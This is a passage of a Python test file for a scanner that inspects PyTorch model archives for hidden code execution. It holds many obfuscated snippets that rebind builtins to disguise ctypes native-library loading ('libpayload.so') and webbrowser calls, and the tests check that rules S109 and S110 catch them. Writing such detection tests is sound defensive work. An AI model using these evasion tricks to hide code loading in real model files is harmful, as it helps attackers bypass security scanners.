            b"namespace = builtins.__dict__\nnamespace |= {'list': lambda iterable: None}\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"for list in [lambda iterable: None]:\n    pass\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport contextlib\n",
            b"with contextlib.nullcontext(lambda iterable: None) as list:\n    pass\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"match (lambda iterable: None):\n    case list:\n        pass\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins as b\n",
            b"b.setattr(b, 'list', lambda iterable: None)\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
            b"original_list = builtins.list\nbuiltins.list = lambda iterable: None\n"
            b"globals()['original_list'] = lambda iterable: None\nbuiltins.list = original_list\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
            b"original = c.CDLL\nc.CDLL = print\nnamespace = builtins.__dict__\n"
            b"namespace |= {'ValueError': RuntimeError}\ntry:\n    raise RuntimeError()\n"
            b"except ValueError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nfor b.setattr in [lambda *args: None]:\n    pass\n"
            b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nfor b.list in [lambda iterable: None]:\n    pass\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nnamespace = b.vars(b)\n"
            b"for namespace['list'] in [lambda iterable: None]:\n    pass\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nimport contextlib\n"
            b"with contextlib.nullcontext(lambda *args: None) as b.setattr:\n    pass\n"
            b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nb.setattr(b, 'setattr', lambda *args: None)\n"
            b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nb.setattr(b, 'vars', lambda obj: {})\n"
            b"b.vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nreal_vars = b.vars\nb.vars = lambda obj: {}\n"
            b"real_vars(b).update({'setattr': lambda *args: None})\n"
            b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nreal_setattr = b.setattr\nb.setattr = lambda *args: None\n"
            b"real_setattr(b, 'vars', lambda obj: {})\n"
            b"b.vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins as b\nreal_vars = b.vars\nb.vars = lambda obj: {}\n",
            b"real_vars(b).update({'setattr': lambda *args: None})\n"
            b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins as b\nreal_setattr = b.setattr\nb.setattr = lambda *args: None\n",
            b"real_setattr(b, 'vars', lambda obj: {})\n"
            b"b.vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins as b\nreal_vars = b.vars\nb.vars = lambda obj: {}\n"
            b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n",
            b"real_vars(b).update({'setattr': lambda *args: None})\n"
            b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins as b\nreal_setattr = b.setattr\n"
            b"b.setattr = lambda *args: None\nif globals().get('enabled'):\n"
            b"    real_setattr = lambda *args: None\n",
            b"real_setattr(b, 'vars', lambda obj: {})\n"
            b"b.vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins as b\nreal_vars = b.vars\nb.vars = lambda obj: {}\n"
            b"enabled = True\nif globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
            b"b.vars = real_vars\n",
            b"b.vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins as b\nreal_setattr = b.setattr\n"
            b"b.setattr = lambda *args: None\nenabled = True\n"
            b"if globals().get('enabled'):\n    real_setattr = lambda *args: None\n"
            b"b.setattr = real_setattr\n",
            b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nreal_vars = b.vars\nenabled = True\n"
            b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
            b"real_vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins as b\nreal_vars = b.vars\nenabled = True\n"
            b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n",
            b"real_vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nreal_setattr = b.setattr\nenabled = True\n"
            b"if globals().get('enabled'):\n    real_setattr = lambda *args: None\n"
            b"real_setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins as b\nreal_setattr = b.setattr\nenabled = True\n"
            b"if globals().get('enabled'):\n    real_setattr = lambda *args: None\n",
            b"real_setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nreal_setattr = b.setattr\nreal_vars = b.vars\n"
            b"b.vars = lambda obj: {}\nenabled = True\n"
            b"if globals().get('enabled'):\n    real_setattr = lambda *args: None\n"
            b"real_setattr(b, 'vars', real_vars)\n"
            b"b.vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins as b\nreal_setattr = b.setattr\n"
            b"b.setattr = lambda *args: None\nenabled = True\n"
            b"if globals().get('enabled'):\n    real_setattr = lambda *args: None\n",
            b"real_setattr(b, 'setattr', real_setattr)\n"
            b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nns = b.vars(b)\nupdate = ns.update\n"
            b"update({'setattr': lambda *args: None})\n"
            b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nns = b.vars(b)\nupdate = ns.update\n"
            b"update({'list': lambda iterable: None})\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nns = b.vars(b)\nsetitem = ns.__setitem__\n"
            b"setitem('setattr', lambda *args: None)\n"
            b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nreal_vars = b.vars\nreal_setattr = b.setattr\n"
            b"b.setattr = lambda *args: None\nenabled = True\n"
            b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
            b"namespace = real_vars(b)\nput = namespace.__setitem__\n"
            b"put('setattr', real_setattr)\nb.setattr(c, 'CDLL', print)\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nreal_vars = b.vars\nreal_setattr = b.setattr\n"
            b"b.setattr = lambda *args: None\nenabled = True\n"
            b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
            b"namespace = real_vars(b)\nput = namespace.__setitem__\nrelay = put\n"
            b"relay('setattr', real_setattr)\nb.setattr(c, 'CDLL', print)\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\ndict.update(b.__dict__, {'setattr': lambda *args: None})\n"
            b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nfor print in [original]:\n    pass\n"
            b"c.CDLL = print\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport contextlib\n",
            b"original = c.CDLL\nwith contextlib.nullcontext(original) as print:\n    pass\n"
            b"c.CDLL = print\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nmatch original:\n    case print:\n        pass\n"
            b"c.CDLL = print\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
            b"original = c.CDLL\nnamespace = builtins.__dict__\nnamespace['print'] = original\n"
            b"c.CDLL = print\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins as b\n",
            b"b.setattr = lambda *args: None\nb.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins as b\n",
            b"namespace = b.__dict__\nnamespace |= {'setattr': lambda *args: None}\n"
            b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"match (lambda iterable: None):\n    case _ if False:\n        pass\n"
            b"    case list:\n        pass\nlist(c.__dict__.update(CDLL=print) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nValueError = TypeError\nmatch RuntimeError:\n"
            b"    case ValueError:\n        pass\ntry:\n    raise RuntimeError()\n"
            b"except ValueError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nValueError = TypeError\n"
            b"for (ValueError,) in [(RuntimeError,)]:\n    pass\ntry:\n    raise RuntimeError()\n"
            b"except ValueError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nreal_setattr = b.setattr\nenabled = True\n"
            b"if globals().get('enabled'):\n    real_setattr = lambda *args: None\n"
            b"real_setattr(b, 'ValueError', RuntimeError)\ntry:\n    raise RuntimeError()\n"
            b"except ValueError:\n    c.CDLL = print\nexcept RuntimeError:\n    pass\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"import builtins as b\nreal_vars = b.vars\nenabled = True\n"
            b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
            b"namespace = real_vars(b)\nput = namespace.__setitem__\n"
            b"put('ValueError', RuntimeError)\ntry:\n    raise RuntimeError()\n"
            b"except ValueError:\n    c.CDLL = print\nexcept RuntimeError:\n    pass\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\ntry:\n    raise RuntimeError()\nexcept RuntimeError:\n"
            b"    wb.open = original\nopener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nfor _ in [0]:\n    continue\nelse:\n"
            b"    wb.open = original\nopener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\ntry:\n    1 / 0\nexcept ZeroDivisionError:\n"
            b"    wb.open = original\nopener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"try:\n    raise RuntimeError()\nexcept ValueError:\n    wb.open = print\nexcept RuntimeError:\n    pass\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
    ],
)
def test_pytorch_zip_preserves_dangerous_typed_member_captured_before_safe_overwrite(
    tmp_path: Path, prefix: bytes, late_state: bytes, rule_code: str
) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    payload = b"\x00\xff" + prefix + padding + late_state + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == rule_code
        for check in result.checks
    )


def test_pytorch_zip_detects_native_load_in_rebound_typed_member_self_write(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    payload = (
        b"\x00\xffimport ctypes as c\nimport webbrowser as wb\n"
        + padding
        + b"wb = c.cdll\nwb.open = wb.open\n"
        + padding
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S110"
        for check in result.checks
    )


def test_pytorch_zip_detects_typed_member_restore_after_state_overflow(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    alternating_state = (b"wb.open = original\nwb.open = print\n" * 24) + b"wb.open = original\n"
    payload = (
        b"\x00\xffimport webbrowser as wb\n"
        + padding
        + b"original = wb.open\n"
        + alternating_state
        + b"opener = wb.open\nopener('https://example.invalid')\n"
        + padding
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S109"
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("prefix", "initial_binding", "endpoint", "rule_code"),
    [
        (
            b"import webbrowser as wb\n",
            b"value_0 = wb.open\n",
            b"value_1999('https://example.invalid')\n",
            "S109",
        ),
        (b"import ctypes as c\n", b"value_0 = c.CDLL\n", b"value_1999('libpayload.so')\n", "S110"),
        (b"import ctypes as c\n", b"value_0 = c.cdll\n", b"value_1999.msvcrt\n", "S110"),
        (b"from webbrowser import open as value_0\n", b"", b"value_1999('https://example.invalid')\n", "S109"),
        (b"from ctypes import CDLL as value_0\n", b"", b"value_1999('libpayload.so')\n", "S110"),
        (b"from ctypes import cdll as value_0\n", b"", b"value_1999.msvcrt\n", "S110"),
    ],
)
def test_pytorch_zip_preserves_late_rule_identity_beyond_replay_budget(
    tmp_path: Path, prefix: bytes, initial_binding: bytes, endpoint: bytes, rule_code: str
) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    bindings = initial_binding + b"".join(f"value_{index} = value_{index - 1}\n".encode() for index in range(1, 2_000))
    payload = b"\x00\xff" + prefix + padding + bindings + endpoint + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    relevant = [
        check
        for check in result.checks
        if check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
    ]
    assert any(check.rule_code == rule_code for check in relevant)
    assert not any(check.rule_code == "S108" for check in relevant)


@pytest.mark.parametrize(
    ("prefix_state", "late_state", "expect_finding"),
    [
        (b"", b"rp.run_path = print\n" + b"rp.run_module = print\n" * 8, False),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"rp.run_path: object = original\n" + b"rp.run_module = print\n" * 8,
            True,
        ),
        (b"", b"del rp.run_path\n", False),
        (b"", b"rp.__dict__['run_path'] = print\n", False),
        (b"", b"vars(rp).update(run_path=print)\n", False),
        (b"", b"rp.__dict__.update({'other': print, 'run_path': print})\n", False),
        (b"", b"vars(rp).update(other=print, run_path=print)\n", False),
        (b"", b"rp.__dict__.update(**{'run_path': print})\n", False),
        (b"", b"dict.update(rp.__dict__, run_path=print)\n", False),
        (b"", b"overwrite = dict.update\noverwrite(rp.__dict__, run_path=print)\n", False),
        (b"", b"import builtins\noverwrite = builtins.dict.update\noverwrite(rp.__dict__, run_path=print)\n", False),
        (b"", b"import builtins as bi\nbi.dict.update(rp.__dict__, run_path=print)\n", False),
        (b"", b"ns = rp.__dict__\nns.update(run_path=print)\n", False),
        (b"", b"restore = vars(rp).update\nrestore(run_path=print)\n", False),
        (
            b"",
            b"import builtins\nnamespace_of = builtins.vars\nbuiltins.vars = lambda obj: {}\n"
            b"mapping = namespace_of(rp)\nrestore = mapping.update\nrestore(run_path=print)\n",
            False,
        ),
        (b"", b"\x00\xffns = rp.__dict__\nns.update(run_path=print)\n", False),
        (b"", b"\x00\xffrestore = vars(rp).update\nrestore(run_path=print)\n", False),
        (b"", b"mod = rp\nns = mod.__dict__\nns.update(run_path=print)\n", False),
        (b"", b"mod = rp\nrestore = vars(mod).update\nrestore(run_path=print)\n", False),
        (b"", b"mod = rp\nmapping = mod.__dict__\nrestore = mapping.update\nrestore(run_path=print)\n", False),
        (
            b"",
            b"mod = rp\nmapping = mod.__dict__\nsecond = mapping\nrestore = second.update\nrestore(run_path=print)\n",
            False,
        ),
        (
            b"",
            b"mod = rp\nmapping = mod.__dict__\nrestore = mapping.update\napply = restore\napply(run_path=print)\n",
            False,
        ),
        (b"", b"rp.__dict__['run' + '_path'] = print\n", False),
        (b"", b"rp.__dict__[\n    'run' + '_path'\n] = print\n", False),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
            b"dict = Safe\ndict.update(rp.__dict__, run_path=original)\n",
            False,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins as bi\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nbi.dict = Safe\nbuiltins.dict.update(rp.__dict__, run_path=original)\n",
            False,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
            b"real_dict = dict\ndict = Safe\ndict = real_dict\n"
            b"dict.update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"",
            b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
            b"real_dict = dict\ndict = Safe\ndict = real_dict\n"
            b"dict.update(rp.__dict__, run_path=print)\n",
            False,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins as bi\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal_dict = bi.dict\nbi.dict = Safe\nbi.dict = real_dict\n"
            b"builtins.dict.update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins as bi\nbi.dict.update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"",
            b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
            b"if globals().get('enabled'):\n    dict = Safe\n"
            b"dict.update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"",
            b"rp.run_path = print\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nif globals().get('enabled'):\n    dict = Safe\n"
            b"dict.update(rp.__dict__, run_path=print)\n",
            False,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nif globals().get('enabled'):\n    builtins.dict = Safe\n"
            b"builtins.dict.update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"",
            b"rp.run_path = print\nimport builtins\nclass Safe:\n    @staticmethod\n"
            b"    def update(*args, **kwargs):\n        pass\nif globals().get('enabled'):\n"
            b"    builtins.dict = Safe\nbuiltins.dict.update(rp.__dict__, run_path=print)\n",
            False,
        ),
        (
            b"",
            b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
            b"if globals().get('enabled'):\n    dict = Safe\n"
            b"dict.update(\n    rp.__dict__, run_path=print\n)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nbuiltins.__dict__['dict'] = Safe\n"
            b"builtins.dict.update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nbuiltins.__dict__.update(dict=Safe)\n"
            b"builtins.dict.update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"",
            b"import builtins as bi\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nvars(bi).update(dict=Safe)\n"
            b"builtins.dict.update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nmapping = builtins.__dict__\n"
            b"mapping.update(dict=real)\nbuiltins.dict.update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nbuiltins.__dict__.update(\n"
            b"    dict=real\n)\nbuiltins.dict.update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"",
            b"import builtins\ngetattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
            False,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\ngetattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\ndef inert():\n    builtins.dict = Safe\n"
            b"builtins.dict.update(rp.__dict__, run_path=print)\n",
            False,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nbi = builtins\nbi.dict = Safe\n"
            b"builtins.dict.update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins as bi\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nclass Holder:\n    pass\nbi = Holder()\nbi.dict = Safe\n"
            b"builtins.dict.update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"class Restore:\n    rp.run_path = original\n",
            True,
        ),
        (b"", b"class SafeState:\n    rp.run_path = print\n", False),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nclass Shadow:\n    builtins.dict = Safe\n"
            b"builtins.dict.update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\ngetattr = lambda *args: Safe\n"
            b"getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\ngetattr = lambda *args: Safe\n"
            b"getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
            False,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nvars = lambda obj: {}\nvars(builtins).update(dict=Safe)\n"
            b"builtins.dict.update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"",
            b"restore = (\n    dict.update\n)\nrestore(rp.__dict__, run_path=print)\n",
            False,
        ),
        (
            b"",
            b"import builtins\nrestore = getattr(builtins, 'dict').update\nrestore(rp.__dict__, run_path=print)\n",
            False,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nmapping = builtins.__dict__\n"
            b"restore = mapping.update\nrestore(dict=real)\n"
            b"builtins.dict.update(rp.__dict__, run_path=print)\n",
            False,
        ),
        (
            b"",
            b"ns = rp.__dict__\nif globals().get('enabled'):\n    ns = {}\nns.update(run_path=print)\n",
            True,
        ),
        (
            b"",
            b"class Safe:\n    run_path = print\nmod = rp\n"
            b"if globals().get('enabled'):\n    mod = Safe\nmod.run_path = print\n",
            True,
        ),
        (
            b"",
            b"class SafeState:\n    apply = dict.update\n    apply(rp.__dict__, run_path=print)\n",
            False,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\ngetattr = lambda *args: Safe\n"
            b"if globals().get('enabled'):\n    getattr = builtins.getattr\n"
            b"getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nbuiltins.getattr = lambda *args: Safe\n"
            b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nbuiltins.getattr = lambda *args: Safe\n"
            b"getattr \\\n (builtins, 'dict').update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nif globals().get('enabled'):\n    builtins.getattr = lambda *args: Safe\n"
            b"getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nbuiltins.__dict__['getattr'] = lambda *args: Safe\n"
            b"getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nvars(builtins)['getattr'] = lambda *args: Safe\n"
            b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nvars(builtins).__setitem__('getattr', lambda *args: Safe)\n"
            b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nvars(builtins).update(getattr=lambda *args: Safe)\n"
            b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"",
